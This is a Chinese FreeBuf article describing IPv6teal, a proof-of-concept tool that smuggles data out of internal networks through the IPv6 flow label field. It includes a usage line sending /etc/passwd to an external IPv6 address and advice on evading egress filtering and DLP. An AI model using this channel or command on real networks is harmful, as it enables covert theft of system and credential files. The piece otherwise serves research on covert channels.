**IPv6teal是一款由Python 3编写的工具，它可以使用构建在IPv6报头流标签字段之上的隐蔽信道，隐蔽的从内部网络中泄露数据。**

其主要由以下2个部分组成：

>
> [exfiltrate.py](https://github.com/christophetd/IPv6teal/blob/master/exfiltrate.py)：客户端组件，用于从内部计算机中泄露数据
>
>
> [receive.py](https://github.com/christophetd/IPv6teal/blob/master/receive.py)：服务器端组件，用于接收窃取数据

## 背景

Flow Label：20比特。IPv6中新增。

![61957346-9b870c00-afae-11e9-9ac3-4b2c0e0dedb7.png](https://image.3001.net/images/20190809/1565308079_5d4cb4af7dc86.png!small)

>
> 流标签可用来标记特定流的报文，以便在网络层区分不同的报文。转发路径上的路由器可以根据流标签来区分流并进行处理。由于流标签在IPv6报文头中携带，转发路由器可以不必根据报文内容来识别不同的流，目的节点也同样可以根据流标签识别流，同时由于流标签在报文头中，因此使用IPSec后仍然可以根据流标签进行QoS处理。
>
> (Wikipedia)

可以将该字段设置为任意值，而不会影响数据包传递到其目标。

因此，我们可以通过在此字段中存储数据来构建隐蔽信道。exfiltration脚本每20比特数据发送1个IPv6数据包，receiver脚本通过读取该字段重建数据。每个IPv6数据包发送的payload包含一个魔术值（magic
value）以及一个序列号。因此，接收端可以确定哪些IPv6分组与其相关并进行解码。

## 使用

 **基本要求：**

> 客户端（存数据）和服务器（窃取数据）都需要支持IPv6并拥有IPv6地址。在测试中，我使用的是5美元/月的DigitalOcean droplet。
>
> 客户端和服务器都需要安装scapy（pip install scapy==2.4.2）
>
> Python 3

### Server

在提取数据的计算机上，以root身份运行receive.py。

    
    
    $ python3 receive.py hashes
    
    [-] Started receiver

### Client

在泄露数据的计算机上，以root身份运行exfiltrate.py。

    
    
    $ python3 exfiltrate.py --help
    
    usage: exfiltrate.py [-h] [--packet-sending-interval-ms SENDING_INTERVAL]
                         input_file destination
    
    positional arguments:
      input_file            File to exfiltrate
      destination           IPv6 address where to exfiltrate data
    
    optional arguments:
      -h, --help            show this help message and exit
      --packet-sending-interval-ms SENDING_INTERVAL
                            Number of milliseconds to wait between each IPv6
                            packet to send (default: 10)

使用示例：

    
    
    $ python3 exfiltrate.py /etc/passwd 2a03:b0c0:3:d0::cee:8001  
                                                                                                   
    Sending 560 bytes (4480 bits) in 225 IPv6 packets...    
                                                                                                                                                         
    ..................................................                                                                                                                                                           
    ..................................................                                                                                                                                                           
    ..................................................                                                                                                                                                           
    ..................................................                                                                                                                                                           
    ........................                                          
                                                                                                                                               
    done                                  

## F.A.Q.

 **我们不能直接将数据存储在ICMPv6 echo-request数据包或IPv6数据包本身的payload中吗？**

当然可以。然而，这个PoC是为企业网络的（虚构）场景构建的，企业网络将具有严格的出口网络过滤，例如，将阻止从内部用户网络到互联网的ICMPv6，和/或DLP将分析IPv6/ICMPv6数据包的payload。

即使在这种情况下，也不太可能阻止所有传出的IPv6通信，因此仍然允许使用该技术进行数据泄露。

 **它的速度怎么样？**

虽然发送的数据是使用GZIP压缩的，但速度非常慢。通过网络发送的每个IPv6数据包包含20比特数据（即两个半ASCII字符）。

在我的测试中，我设法在30分钟内在不同的DigitalOcean区域（阿姆斯特丹和法兰克福）的2台机器上传输1.2 MB的未压缩随机数据文件。

 **它可靠吗？**

我的回答是不。任何IPv6数据包丢失都会导致传输失败。这是我故意这么做的，为了保持工具的简单特性，避免重新实现类似TCP的伪网络堆栈。

然后，它会处理乱序的IPv6数据包。

 **传输是否加密？**

我的回答同样是不。如果你要传输敏感数据，最好在将数据提供给exfiltration脚本之前对客户端的数据进行加密。

 **它可以处理大文件吗？**

可能不行。也许。无论如何它会很慢。

 **为什么脚本需要以root身份运行？**

因为他们制作原始的ipv6数据包。如果这对你来说是个问题，那么你也可以将cap-net-raw功能提供给非超级用户，并让它来运行脚本。

 **有些数据包丢失了，该怎么办？**

尝试增加exfiltration脚本的--packet-sending-interval-ms参数值。默认情况下为10毫秒，这意味着程序在发送每个新数据包之前会等待10毫秒。

## 关于

该工具的最初灵感来源于锡拉丘兹大学的Norka B. Lucena，Grzegorz Lewandowski和Steve J.
Chapin撰写的有关[IPv6中的隐蔽信道](https://link.springer.com/chapter/10.1007/11767831_10)的论文。

如果你对该工具有任何的疑问或错误报告，请随时[打开issue](https://github.com/christophetd/ipv6teal/issues/new)或向我发送tweet
[@christophetd](https://twitter.com/christophetd)。

***参考来源：[GitHub](https://github.com/christophetd/IPv6teal)，FB小编secist编译，转载请注明来自FreeBuf.COM**  

